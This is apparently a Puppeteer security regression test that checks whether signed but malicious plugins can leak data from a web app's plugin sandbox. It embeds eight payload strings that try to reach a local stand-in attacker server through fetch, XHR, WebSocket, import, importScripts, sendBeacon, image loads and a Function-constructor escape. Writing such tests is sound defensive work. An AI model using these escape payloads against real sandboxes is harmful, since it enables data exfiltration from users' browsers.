// Security regression test: a TRUSTED, correctly SIGNED but malicious plugin must not be able to
// send a single byte to an attacker-controlled server. Fails (exit 1) if anything leaks.
// Run: npx vite dev --port 5199, then  node scripts/browser/plugin-sandbox-attack.mjs
import puppeteer from 'puppeteer-core';
import http from 'node:http';
// A REAL listener the attacker would own. If any byte reaches it, the sandbox leaked.
let received = [];
const srv = http.createServer((req, res) => { received.push(req.method + ' ' + req.url); res.setHeader('access-control-allow-origin', '*'); res.setHeader('content-type', 'application/javascript'); res.end('self.postMessage("PWNED")'); }).listen(9917, '127.0.0.1');
const b = await puppeteer.launch({ executablePath: process.env.CHROME_PATH || '/usr/bin/google-chrome', headless: 'new', args: ['--no-sandbox', '--disable-gpu'] });
const p = await b.newPage();
await p.goto('http://127.0.0.1:5199/vault', { waitUntil: 'networkidle2' });
const run = async (label, workerCtor) => p.evaluate(async (label, workerCtor) => {
  const sign = await import('/src/lib/plugin-signing.ts'); const mod = await import('/src/lib/plugins.ts');
  const kp = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify']);
  await sign.trustPublisherKey('k' + label, await crypto.subtle.exportKey('jwk', kp.publicKey));
  const b64 = u => btoa(String.fromCharCode(...u));
  const mk = async (id, code) => { const manifest = { id, name: id, version: '1', kind: 'filter', code, params: [], permissions: ['filters'], expiresAt: Date.now() + 3.6e6 }; const sig = new Uint8Array(await crypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, kp.privateKey, await sign.pluginDigest(manifest))); return { id, name: id, code, params: [], manifest, signature: b64(sig), publisherKeyId: 'k' + label }; };
  const img = new ImageData(new Uint8ClampedArray(64).fill(1), 4, 4);
  const base = 'http://127.0.0.1:9917/';
  const attacks = {
    import: `import('${base}IMPORT_${label}.js').catch(function(){}); ctx.data[0]=1`,
    fetch: `try{ self.fetch('${base}FETCH_${label}') }catch(e){} ctx.data[0]=1`,
    xhr: `try{ var x=new XMLHttpRequest(); x.open('GET','${base}XHR_${label}'); x.send() }catch(e){} ctx.data[0]=1`,
    ws: `try{ new WebSocket('ws://127.0.0.1:9917/WS_${label}') }catch(e){} ctx.data[0]=1`,
    importScripts: `try{ importScripts('${base}IS_${label}.js') }catch(e){} ctx.data[0]=1`,
    ctor: `try{ (function(){}).constructor('return this')().fetch('${base}CTOR_${label}') }catch(e){} ctx.data[0]=1`,
    beacon: `try{ self.navigator.sendBeacon('${base}BEACON_${label}','x') }catch(e){} ctx.data[0]=1`,
    cssimg: `try{ new Image().src='${base}IMG_${label}' }catch(e){} ctx.data[0]=1`,
  };
  const r = {}; for (const [n, code] of Object.entries(attacks)) { try { await mod.runPlugin(await mk('x.' + n, code), img, {}, 2500); r[n] = 'ran'; } catch (e) { r[n] = 'err ' + e.message.slice(0, 40); } } return r;
}, label, workerCtor);
console.log(await run('A'));
await new Promise(r => setTimeout(r, 1200));
console.log('\nBYTES THAT REACHED THE ATTACKER SERVER:', received.length ? received : 'NONE');
srv.close(); await b.close(); process.exit(received.length ? 1 : 0);
